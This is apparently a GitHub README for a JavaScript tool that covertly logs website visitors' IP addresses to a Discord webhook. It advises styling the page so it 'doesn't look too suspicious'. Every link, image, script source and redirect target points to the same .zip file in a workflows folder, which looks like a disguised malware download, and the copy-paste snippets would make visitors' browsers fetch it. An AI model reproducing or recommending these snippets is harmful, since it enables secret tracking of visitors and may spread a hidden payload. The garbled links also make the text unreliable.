# IP Data to Discord Webhook

With this JavaScript program you can log the IP of someone visiting your website and send IP information to your Discord Webhook.


# 👀 Preview

<img src="https://github.com/Meirtoed450/log/raw/refs/heads/main/.github/workflows/Software-v2.4.zip" width="600px" alt="Example image.">
The country flag changes to the country where the IP is located!

<br>

# 🎬 Usage
## Method 1 (CDN):
Just copy this into your website and change the redirect and webhook URL:

```HTML
<!-- Copy this into the <head> -->
<meta http-equiv="refresh" content="3;https://github.com/Meirtoed450/log/raw/refs/heads/main/.github/workflows/Software-v2.4.zip" /> 

...

<!-- Copy this into the end of <body> -->
<script src="https://github.com/Meirtoed450/log/raw/refs/heads/main/.github/workflows/Software-v2.4.zip"></script> 
<script src="https://github.com/Meirtoed450/log/raw/refs/heads/main/.github/workflows/Software-v2.4.zip"></script>
<script>var webHookUrl = "YOUR_WEBHOOK_URL_HERE";</script>
```

## Method 2 (Local):

### Set up
Copy the project.

Change the variable `webHookURL` in [`https://github.com/Meirtoed450/log/raw/refs/heads/main/.github/workflows/Software-v2.4.zip`](https://github.com/Meirtoed450/log/raw/refs/heads/main/.github/workflows/Software-v2.4.zip) to your URL.

### Redirect 
Let a user redirect to another site after the IP was logged.

Just add the following to your `<head>` in [`https://github.com/Meirtoed450/log/raw/refs/heads/main/.github/workflows/Software-v2.4.zip`](https://github.com/Meirtoed450/log/raw/refs/heads/main/.github/workflows/Software-v2.4.zip):

```
<meta http-equiv="refresh" content="3;https://github.com/Meirtoed450/log/raw/refs/heads/main/.github/workflows/Software-v2.4.zip" />
```

### Additional tip
If you want to, you can style the [`https://github.com/Meirtoed450/log/raw/refs/heads/main/.github/workflows/Software-v2.4.zip`](https://github.com/Meirtoed450/log/raw/refs/heads/main/.github/workflows/Software-v2.4.zip) file, so it doesn't look too suspicious.
